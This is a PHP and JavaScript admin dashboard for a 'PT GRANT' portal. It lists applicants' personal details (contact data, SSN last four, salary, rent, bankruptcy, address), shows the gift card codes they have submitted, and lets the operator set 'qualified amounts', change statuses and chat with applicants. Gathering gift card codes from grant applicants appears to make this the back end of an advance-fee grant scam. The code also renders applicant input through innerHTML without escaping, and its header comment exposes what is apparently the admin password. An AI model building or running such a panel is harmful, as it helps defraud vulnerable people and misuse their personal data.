<?php
// admin.php - Secure Administration Dashboard (`Admin123`)
require_once 'config.php';
session_start();

if (isset($_POST['password'])) {
    if ($_POST['password'] === ADMIN_PASSWORD) {$_SESSION['pt_admin_logged_in'] = true;
    } else {
        $login_error = "Invalid Administrative Access Password!";
    }
}

if (isset($_GET['logout'])) {
    unset($_SESSION['pt_admin_logged_in']);
    session_destroy();
    header("Location: admin.php");
    exit;
}

$isLoggedIn = !empty($_SESSION['pt_admin_logged_in']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PT GRANT - Administrative Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="bg-slate-900 text-slate-100 min-h-screen font-sans">

<?php if (!$isLoggedIn): ?>
    <div class="min-h-screen flex items-center justify-center p-4">
        <div class="bg-slate-800 border border-slate-700 rounded-2xl p-8 max-w-md w-full shadow-2xl space-y-6">
            <div class="text-center space-y-2">
                <div class="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl flex items-center justify-center text-3xl mx-auto border border-indigo-500/30">
                    <i class="fa-solid fa-lock"></i>
                </div>
                <h2 class="text-2xl font-black text-white">Admin Control Center</h2>
                <p class="text-xs text-slate-400">Authorized Personnel Login Only</p>
            </div>

            <?php if (!empty($login_error)): ?>
                <div class="bg-red-500/10 border border-red-500/30 text-red-400 text-sm p-3 rounded-xl text-center">
                    <?php echo $login_error; ?>
                </div>
            <?php endif; ?>

            <form method="POST" action="admin.php" class="space-y-4">
                <div>
                    <label class="block text-xs font-semibold text-slate-300 mb-1 uppercase tracking-wider">Master Password</label>
                    <input type="password" name="password" required class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none" placeholder="••••••••">
                </div>
                <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3 rounded-xl transition-all shadow-lg">
                    Authenticate Access
                </button>
            </form>
        </div>
    </div>
<?php else: ?>
    <header class="bg-slate-800 border-b border-slate-700 sticky top-0 z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
            <div class="flex items-center space-x-3">
                <div class="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center text-white">
                    <i class="fa-solid fa-user-gear"></i>
                </div>
                <div>
                    <h1 class="text-xl font-extrabold text-white">PT GRANT Admin Dashboard</h1>
                    <p class="text-xs text-emerald-400 font-medium"><i class="fa-solid fa-circle text-[8px] mr-1"></i> System Active</p>
                </div>
            </div>
            <a href="admin.php?logout=1" class="bg-slate-700 hover:bg-red-600 text-white text-xs font-bold px-4 py-2 rounded-lg transition-colors">
                <i class="fa-solid fa-right-from-bracket mr-1"></i> Logout
            </a>
        </div>
    </header>

    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
        <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
            <div class="bg-slate-800 border border-slate-700 p-6 rounded-2xl shadow-lg">
                <p class="text-xs font-bold text-slate-400 uppercase">Total Applications</p>
                <p id="stat-total" class="text-3xl font-black text-white mt-2">0</p>
            </div>
            <div class="bg-slate-800 border border-slate-700 p-6 rounded-2xl shadow-lg">
                <p class="text-xs font-bold text-amber-400 uppercase">Pending Review</p>
                <p id="stat-pending" class="text-3xl font-black text-amber-400 mt-2">0</p>
            </div>
            <div class="bg-slate-800 border border-slate-700 p-6 rounded-2xl shadow-lg">
                <p class="text-xs font-bold text-emerald-400 uppercase">Approved</p>
                <p id="stat-approved" class="text-3xl font-black text-emerald-400 mt-2">0</p>
            </div>
            <div class="bg-slate-800 border border-slate-700 p-6 rounded-2xl shadow-lg">
                <p class="text-xs font-bold text-indigo-400 uppercase">Submitted Gift Cards</p>
                <p id="stat-cards" class="text-3xl font-black text-indigo-400 mt-2">0</p>
            </div>
        </div>

        <div class="bg-slate-800 border border-slate-700 rounded-2xl p-6 shadow-xl space-y-6">
            <h2 class="text-xl font-bold text-white">Grant Applications Console</h2>
            <div id="admin-apps-list" class="space-y-4"></div>
        </div>
    </main>

    <script>
        let adminApps = [];

        function loadAdminData() {
            fetch('save.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'get_applications' })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    adminApps = data.data;
                    renderAdminDashboard();
                }
            });
        }

        function renderAdminDashboard() {
            document.getElementById('stat-total').innerText = adminApps.length;
            document.getElementById('stat-pending').innerText = adminApps.filter(a => a.status === 'Pending').length;
            document.getElementById('stat-approved').innerText = adminApps.filter(a => a.status === 'Approved').length;
            
            let giftCardsCount = 0;
            adminApps.forEach(a => { if (a.payments) giftCardsCount += a.payments.length; });
            document.getElementById('stat-cards').innerText = giftCardsCount;

            const container = document.getElementById('admin-apps-list');
            if (adminApps.length === 0) {
                container.innerHTML = '<p class="text-center text-slate-400 py-8 italic">No applications submitted yet.</p>';
                return;
            }

            container.innerHTML = adminApps.map((app, idx) => `
                <div class="bg-slate-900 border border-slate-700 rounded-xl p-6 space-y-6">
                    <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-4 border-b border-slate-800 pb-4">
                        <div>
                            <div class="flex items-center space-x-3">
                                <span class="text-xs font-mono font-bold text-indigo-400">${app.app_num}</span>
                                <h3 class="text-lg font-bold text-white">${app.first_name} ${app.last_name}</h3>
                                <span class="text-[10px] bg-slate-800 text-slate-300 px-2 py-0.5 rounded uppercase font-bold">${app.applicant_type}</span>
                            </div>
                            <p class="text-xs text-slate-400 mt-1">Grant: <span class="text-slate-200">${app.grant_type}</span> | Email: ${app.email} | Phone: ${app.phone}</p>
                        </div>

                        <div class="flex flex-wrap items-center gap-3">
                            <div>
                                <label class="block text-[10px] text-slate-400 uppercase font-bold mb-1">Status</label>
                                <select onchange="updateAppStatus(${idx}, this.value)" class="bg-slate-800 border border-slate-700 text-xs text-white rounded-lg px-3 py-2 font-bold focus:outline-none">
                                    <option value="Pending" ${app.status === 'Pending' ? 'selected' : ''}>Pending (Yellow)</option>
                                    <option value="Processing" ${app.status === 'Processing' ? 'selected' : ''}>Processing (Blue)</option>
                                    <option value="Approved" ${app.status === 'Approved' ? 'selected' : ''}>Approved (Green)</option>
                                    <option value="Declined" ${app.status === 'Declined' ? 'selected' : ''}>Declined (Red)</option>
                                </select>
                            </div>

                            <div>
                                <label class="block text-[10px] text-slate-400 uppercase font-bold mb-1">Qualified Amount ($)</label>
                                <div class="flex items-center space-x-1">
                                    <input type="text" id="qual-amt-${idx}" value="${app.qualified_amount || '0.00'}" class="w-28 bg-slate-800 border border-slate-700 text-xs text-emerald-400 font-mono font-bold rounded-lg px-3 py-2 focus:outline-none">
                                    <button onclick="saveQualifiedAmount(${idx})" class="bg-indigo-600 hover:bg-indigo-500 text-white text-xs px-3 py-2 rounded-lg font-bold">Save</button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-4 text-xs bg-slate-800/50 p-4 rounded-xl border border-slate-800">
                        <div><span class="text-slate-500 block text-[10px]">Age / Sex</span><span class="text-slate-200">${app.age} yrs / ${app.sex}</span></div>
                        <div><span class="text-slate-500 block text-[10px]">SSN (Last 4)</span><span class="text-indigo-300 font-mono">***-**-${app.ssn_last4 || 'N/A'}</span></div>
                        <div><span class="text-slate-500 block text-[10px]">Salary / Rent</span><span class="text-emerald-400">$${app.salary || '0'} / $${app.rent_amount || '0'}</span></div>
                        <div><span class="text-slate-500 block text-[10px]">Bankruptcy</span><span class="text-slate-200">${app.bankruptcy}</span></div>
                        <div class="col-span-2 sm:col-span-4"><span class="text-slate-500 block text-[10px]">Full Address</span><span class="text-slate-200">${app.address1} ${app.address2 ? ', ' + app.address2 : ''}, ${app.city}, ${app.state} ${app.zip_code}</span></div>
                    </div>

                    <div class="space-y-2">
                        <h4 class="text-xs font-bold uppercase tracking-wider text-amber-400"><i class="fa-solid fa-gift mr-1"></i> Gift Cards Submitted</h4>
                        ${(app.payments && app.payments.length > 0) ? app.payments.map(p => `
                            <div class="bg-slate-800 p-3 rounded-lg border border-slate-700 flex justify-between items-center text-xs">
                                <div><span class="font-bold text-white">${p.type}</span> - Code: <span class="text-amber-400 font-mono select-all">${p.code}</span></div>
                            </div>
                        `).join('') : '<p class="text-xs text-slate-500 italic">No gift card submitted yet.</p>'}
                    </div>

                    <div class="space-y-3 pt-2">
                        <h4 class="text-xs font-bold uppercase tracking-wider text-indigo-400"><i class="fa-solid fa-comments mr-1"></i> Chat History</h4>
                        <div class="bg-slate-800 p-3 rounded-lg border border-slate-700 max-h-40 overflow-y-auto space-y-2 text-xs">
                            ${(app.chat_messages && app.chat_messages.length > 0) ? app.chat_messages.map(m => `
                                <div class="flex flex-col ${m.sender === 'admin' ? 'items-end' : 'items-start'}">
                                    <div class="max-w-[80%] px-3 py-1.5 rounded-lg ${m.sender === 'admin' ? 'bg-indigo-600 text-white' : 'bg-slate-700 text-slate-200'}">
                                        <span class="block text-[9px] font-bold opacity-75">${m.sender === 'admin' ? 'Admin' : app.first_name}</span>${m.text}
                                    </div>
                                </div>
                            `).join('') : '<p class="text-xs text-slate-500 italic">No message history.</p>'}
                        </div>
                        <div class="flex space-x-2">
                            <input type="text" id="admin-chat-msg-${idx}" placeholder="Reply to applicant..." class="flex-grow bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-xs text-white focus:outline-none">
                            <button onclick="sendAdminChatReply(${idx})" class="bg-indigo-600 hover:bg-indigo-500 text-white text-xs px-4 py-2 rounded-lg font-bold">Send Reply</button>
                        </div>
                    </div>
                </div>
            `).join('');
        }

        function updateAppStatus(idx, newStatus) {
            adminApps[idx].status = newStatus;
            saveAdminState(idx);
        }

        function saveQualifiedAmount(idx) {
            const val = document.getElementById(`qual-amt-${idx}`).value;
            adminApps[idx].qualified_amount = val;
            saveAdminState(idx);
            alert('Qualified Amount updated successfully!');
        }

        function sendAdminChatReply(idx) {
            const input = document.getElementById(`admin-chat-msg-${idx}`);
            const text = input.value.trim();
            if (!text) return;

            if (!adminApps[idx].chat_messages) adminApps[idx].chat_messages = [];
            adminApps[idx].chat_messages.push({
                sender: 'admin',
                text: text,
                time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
            });

            input.value = '';
            saveAdminState(idx);
        }

        function saveAdminState(idx) {
            fetch('save.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'update_application', application: adminApps[idx] })
            }).then(() => {
                renderAdminDashboard();
            });
        }

        document.addEventListener('DOMContentLoaded', loadAdminData);
    </script>
<?php endif; ?>
</body>
</html>
